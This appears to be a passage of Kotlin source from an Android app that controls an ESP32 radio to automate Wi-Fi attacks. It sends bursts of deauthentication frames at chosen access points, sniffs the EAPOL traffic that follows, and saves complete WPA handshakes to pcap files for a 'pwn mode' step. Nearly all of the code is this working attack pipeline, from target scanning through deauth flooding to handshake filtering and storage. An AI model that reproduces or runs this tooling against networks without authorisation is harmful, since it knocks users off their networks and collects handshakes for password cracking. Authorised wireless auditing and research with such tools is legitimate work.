    val captureStart = if (deauthEnabled) {
        sendNrugochiDeauthCapture(activeSession, channel, eligible, model.config)
    } else {
        sendNrugochiPassiveCapture(activeSession, channel)
    }

    if (!captureStart.started) {
        pcapJob.cancelAndJoin()
        autoHandshake.pcapJob = null
        autoHandshake.activePcapJob = null
        autoHandshake.activeWriters = null
        closeNrugochiWriters(writers)
        val failedSession = applyNrugochiChannelResults(
            model = model,
            eligible = eligible,
            validBssids = validBssids,
            completedHandshakes = completedHandshakes,
            packetCounts = packetCounts,
            writers = writers,
            store = store,
            attemptsThisCycle = attemptsThisCycle,
            channel = channel,
            deauthCount = if (deauthEnabled) model.config.deauthFramesPerAp else 0,
            failure = captureStart.message ?: "Capture could not start",
        )
        return NrugochiChannelResult(failedSession, validBssids.size)
    }

    if (deauthEnabled) {
        val sent = captureStart.sentFrames
        val failed = captureStart.failedFrames
        addAutoHandshakeFeed(
            "Channel $channel: deauth TX ${sent}/${captureStart.requestedFrames} frame(s) " +
                "to ${captureStart.targets} AP(s)" +
                if (failed > 0) ", $failed failed." else ".",
            if (sent > 0) LogLevel.INFO else LogLevel.ERROR,
        )
        if (sent == 0) {
            addAutoHandshakeFeed(
                "Deauth TX reported zero successful frames; continuing to capture.",
                LogLevel.ERROR,
            )
        }
    }

    val waitMs = if (deauthEnabled) {
        model.config.channelWaitMs
    } else {
        model.config.channelWaitNoDeauthMs
    }
    val deadline = System.currentTimeMillis() + waitMs
    while (!autoHandshake.stopRequested && System.currentTimeMillis() < deadline) {
        if (validBssids.containsAll(eligibleBssids)) {
            delay(300L)
            break
        }
        delay(100L)
    }

    // Small drain window so late EAPOL/beacon frames already queued in the
    // firmware sniffer are delivered before STOP_SNIFF resets the queue.
    delay(250L)
    pcapJob.cancelAndJoin()
    autoHandshake.pcapJob = null
    autoHandshake.activePcapJob = null
    autoHandshake.activeWriters = null
    runCatching { activeSession.sendCommand("STOP_SNIFF", timeoutMs = 6_000) }
    closeNrugochiWriters(writers)

    val updatedSession = applyNrugochiChannelResults(
        model = model,
        eligible = eligible,
        validBssids = validBssids,
        completedHandshakes = completedHandshakes,
        packetCounts = packetCounts,
        writers = writers,
        store = store,
        attemptsThisCycle = attemptsThisCycle,
        channel = channel,
        deauthCount = if (deauthEnabled) model.config.deauthFramesPerAp else 0,
        failure = null,
    )

    val handshakeCount = validBssids.size
    addAutoHandshakeFeed(
        if (handshakeCount > 0) {
            "Channel $channel complete: $handshakeCount handshake(s) saved."
        } else {
            "Channel $channel complete: no complete handshake."
        },
        if (handshakeCount > 0) LogLevel.SUCCESS else LogLevel.INFO,
    )
    return NrugochiChannelResult(updatedSession, handshakeCount)
}

private data class NrugochiCaptureStart(
    val started: Boolean,
    val requestedFrames: Int = 0,
    val sentFrames: Int = 0,
    val failedFrames: Int = 0,
    val targets: Int = 0,
    val message: String? = null,
)

private suspend fun sendNrugochiDeauthCapture(
    activeSession: NrSession,
    channel: Int,
    eligible: List<AutoHandshakeTarget>,
    config: AutoHandshakeConfig,
): NrugochiCaptureStart {
    val targets = JSONArray()
    eligible.forEach { target ->
        targets.put(JSONObject().put("bssid", target.target.bssid))
    }
    val args = JSONObject().apply {
        put("band", bandForWifiChannel(channel).wireName)
        put("channel", channel)
        put("targets", targets)
        put("count", config.deauthFramesPerAp)
        put("deauth_interval_ms", config.deauthIntervalMs)
        put("reason", 7)
        put("all_beacons", true)
    }
    val response = activeSession.sendCommand(
        "DEAUTH_CHANNEL_CAPTURE",
        args,
        timeoutMs = 30_000,
    )
    return NrugochiCaptureStart(
        started = response?.optBoolean("ok") == true,
        requestedFrames = response?.optInt("requested_frames", 0) ?: 0,
        sentFrames = response?.optInt("sent_frames", 0) ?: 0,
        failedFrames = response?.optInt("failed_frames", 0) ?: 0,
        targets = response?.optInt("targets", 0) ?: 0,
        message = response?.optString("msg"),
    )
}

private suspend fun sendNrugochiPassiveCapture(
    activeSession: NrSession,
    channel: Int,
): NrugochiCaptureStart {
    val args = JSONObject().apply {
        put("mode", "fixed")
        put("band", bandForWifiChannel(channel).wireName)
        put("channel", channel)
        put("eapol_only", true)
        put("all_beacons", true)
    }
    val response = activeSession.sendCommand("START_SNIFF", args, timeoutMs = 12_000)
    return NrugochiCaptureStart(
        started = response?.optBoolean("ok") == true,
        message = response?.optString("msg"),
    )
}

private fun closeNrugochiWriters(writers: Map<String, PcapWriter>) {
    writers.values.forEach { writer ->
        runCatching { writer.close() }
    }
}

private suspend fun MainViewModel.applyNrugochiChannelResults(
    model: AutoHandshakeSession,
    eligible: List<AutoHandshakeTarget>,
    validBssids: Set<String>,
    completedHandshakes: Map<String, WpaHandshake>,
    packetCounts: Map<String, Long>,
    writers: MutableMap<String, PcapWriter>,
    store: AutoHandshakeSessionStore,
    attemptsThisCycle: MutableMap<String, Int>,
    channel: Int,
    deauthCount: Int,
    failure: String?,
): AutoHandshakeSession {
    var updatedSession = model
    var handshakeCount = 0
    val endedAt = System.currentTimeMillis()

    eligible.forEach { target ->
        val bssid = target.target.bssid
        val key = bssid.uppercase()
        val valid = key in validBssids
        var pcapPath: String? = null
        var attemptError: String? = failure
        var attemptValid = false

        if (valid) {
            val temp = store.partialCaptureFile(bssid)
            val finalFile = store.captureFile(bssid)
            val saved = runCatching {
                if (finalFile.exists()) finalFile.delete()
                if (!temp.renameTo(finalFile)) {
                    temp.copyTo(finalFile, overwrite = true)
                    temp.delete()
                }
                finalFile.exists()
            }.getOrDefault(false)
            if (saved) {
                pcapPath = finalFile.absolutePath
                attemptValid = true
                handshakeCount++
                exportPcapToRootIfConfigured(finalFile, force = true)
                recordAutoHandshakeCapture(bssid)
                val captureEntry = CapturedHandshakeEntry(
                    bssid = bssid,
                    ssid = target.target.ssid,
                    channel = channel,
                    pcapPath = finalFile.absolutePath,
                    capturedAt = timestampNow(),
                )
                runCatching { pwnModeStore().upsertCapture(captureEntry) }
                refreshCapturedHandshakes()
                checkPwnModeForCapture(
                    handshake = completedHandshakes[key] ?: completedHandshakes[bssid.uppercase()],
                    ssid = target.target.ssid,
                    entry = captureEntry,
                )
                addAutoHandshakeFeed("Saved ${finalFile.name}.", LogLevel.SUCCESS)
            } else {
                attemptError = "Could not finalize capture file"
                runCatching { temp.delete() }
            }
        } else {
            val temp = store.partialCaptureFile(bssid)
            runCatching { temp.delete() }
            if (attemptError == null) {
                attemptError = "No complete M1/M2 during channel window"
            }
        }

        val attempt = AutoHandshakeAttempt(
            id = "$bssid-$endedAt",
            startedAtMs = autoHandshake.currentAttemptStartedAtMs,
            endedAtMs = endedAt,
            channel = channel,
            bssid = bssid,
            pcapPath = pcapPath,
            packetCount = packetCounts[bssid.uppercase()] ?: 0L,
            deauthBursts = deauthCount,
            m1 = attemptValid,
            m2 = attemptValid,
            valid = attemptValid,
            error = attemptError,
        )

        val finalTarget = target.copy(
            status = if (attemptValid) {
                AutoHandshakeTargetStatus.CAPTURED
            } else {
                AutoHandshakeTargetStatus.NO_HANDSHAKE
            },
            attempts = target.attempts + attempt,
        )
        updatedSession = replaceAutoHandshakeTarget(updatedSession, finalTarget)
        attemptsThisCycle[target.bssidKey] = (attemptsThisCycle[target.bssidKey] ?: 0) + 1
    }

    // Finalize any additional valid writers not represented in the target list.
    writers.keys.forEach { bssid ->
        val key = bssid.uppercase()
        if (key in validBssids && eligible.none { it.target.bssid.equals(bssid, ignoreCase = true) }) {
            val temp = store.partialCaptureFile(bssid)
            val finalFile = store.captureFile(bssid)
            val saved = runCatching {
                if (finalFile.exists()) finalFile.delete()
                if (!temp.renameTo(finalFile)) {
                    temp.copyTo(finalFile, overwrite = true)
                    temp.delete()
                }
                finalFile.exists()
            }.getOrDefault(false)
            if (saved) {
                handshakeCount++
                exportPcapToRootIfConfigured(finalFile, force = true)
                recordAutoHandshakeCapture(bssid)
                val captureEntry = CapturedHandshakeEntry(
                    bssid = bssid,
                    ssid = "",
                    channel = channel,
                    pcapPath = finalFile.absolutePath,
                    capturedAt = timestampNow(),
                )
                runCatching { pwnModeStore().upsertCapture(captureEntry) }
                refreshCapturedHandshakes()
                checkPwnModeForCapture(
                    handshake = completedHandshakes[bssid.uppercase()],
                    ssid = "",
                    entry = captureEntry,
                )
                addAutoHandshakeFeed("Saved ${finalFile.name}.", LogLevel.SUCCESS)
            }
        } else if (key !in validBssids) {
            runCatching { store.partialCaptureFile(bssid).delete() }
        }
    }

    autoHandshake.cycleHandshakeCount = handshakeCount
    val finalSession = updatedSession.copy(
        state = AutoHandshakePhase.INTERACT,
        updatedAt = timestampNow(),
    )
    saveAutoHandshakeSession(finalSession)
    publishAutoHandshake(
        phase = AutoHandshakePhase.INTERACT,
        session = finalSession,
        currentChannel = channel,
        cycleHandshakeCount = handshakeCount,
        cycleTargetCount = eligible.size,
    )
    return finalSession
}

private fun isNrugochiEapolFrame(frame: ByteArray): Boolean {
    if (frame.size < 40) return false
    val radiotapLength = (frame[2].toInt() and 0xFF) or
        ((frame[3].toInt() and 0xFF) shl 8)
    val macBase = radiotapLength
    if (frame.size < macBase + 24) return false

    val fc0 = frame[macBase].toInt() and 0xFF
    val frameType = (fc0 and 0x0C) shr 2
    if (frameType != 2) return false

    val subtype = (fc0 shr 4) and 0x0F
    var offset = macBase + 24
    if (subtype in 8..11) offset += 2

    var index = offset
    val end = frame.size - 8
    while (index <= end) {
        if (frame[index] == 0xAA.toByte() &&
            frame[index + 1] == 0xAA.toByte() &&
            frame[index + 2] == 0x03.toByte() &&
            frame[index + 6] == 0x88.toByte() &&
            frame[index + 7] == 0x8E.toByte()
        ) {
            return true
        }
        index++
    }
    return false
}

private fun resolveNrugochiBssid(frame: ByteArray, knownBssids: Set<String>): String? {
    if (frame.size < 8) return null
    val radiotapLength = (frame[2].toInt() and 0xFF) or
        ((frame[3].toInt() and 0xFF) shl 8)
    val macBase = radiotapLength
    if (frame.size < macBase + 22) return null

    val fc0 = frame[macBase].toInt() and 0xFF
    val frameType = (fc0 and 0x0C) shr 2
    val subtype = (fc0 shr 4) and 0x0F

    if (frameType == 0 && subtype == 8) {
        return macAt(frame, macBase + 16)?.takeIf { it in knownBssids }
    }

    for (offset in intArrayOf(4, 10, 16)) {
        val mac = macAt(frame, macBase + offset) ?: continue
        if (mac in knownBssids) return mac
    }
    return null
}

private fun macAt(frame: ByteArray, offset: Int): String? {
    if (offset + 6 > frame.size) return null
    return buildString(17) {
        for (i in 0 until 6) {
            if (i > 0) append(':')
            val value = frame[offset + i].toInt() and 0xFF
            append(HEX[value ushr 4])
            append(HEX[value and 0x0F])
        }
    }
}

private val HEX = "0123456789ABCDEF".toCharArray()

private suspend fun MainViewModel.collectAutoHandshakeScan(
    activeSession: NrSession,
    timeoutMs: Long,
): NrugochiScanResult {
    val found = ConcurrentHashMap<String, NetworkTarget>()
    val collector = scope.launch {
        activeSession.events.collect { event ->
            if (event.optString("type") != "scan_ap") return@collect
            val bssid = event.optString("bssid")
            if (bssid.isBlank()) return@collect
            found[bssid.uppercase()] = NetworkTarget(
                ssid = event.optString("ssid"),
                bssid = bssid,
                channel = normalizeWifiChannel(event.optInt("channel", 1), fallback = 1),
                rssi = event.optInt("rssi", -100),
                security = event.optString("security", "UNKNOWN"),
                wps = event.optBoolean("wps", false),
            )
        }
    }
    val commandResult = try {
        activeSession.scanWifi(timeoutMs = timeoutMs)
    } finally {
        delay(250L)
        collector.cancelAndJoin()
    }
    return NrugochiScanResult(
        commandResult = commandResult,
        aps = found.values.sortedByDescending { it.rssi },
    )
}

private suspend fun MainViewModel.stopAutoHandshakeRadio(activeSession: NrSession?) {
    val captureWasActive =
        autoHandshake.activePcapJob != null ||
            autoHandshake.activeWriters?.isNotEmpty() == true ||
            autoHandshake.pcapWriter != null

    runCatching { autoHandshake.activePcapJob?.cancel() }
    autoHandshake.activePcapJob = null
    runCatching { autoHandshake.pcapJob?.cancel() }
    autoHandshake.pcapJob = null
    autoHandshake.activeWriters?.let { writers -> closeNrugochiWriters(writers) }
    autoHandshake.activeWriters = null
    runCatching { autoHandshake.pcapWriter?.close() }
    autoHandshake.pcapWriter = null

    // Only send STOP_SNIFF if a capture session was actually active. Sending it
    // while a SCAN_WIFI command is in-flight has caused ESP32-S3 USB CDC
    // detaches on some devices.
    if (activeSession != null && captureWasActive) {
        runCatching { activeSession.sendCommand("STOP_SNIFF", timeoutMs = 5_000) }
    }
}
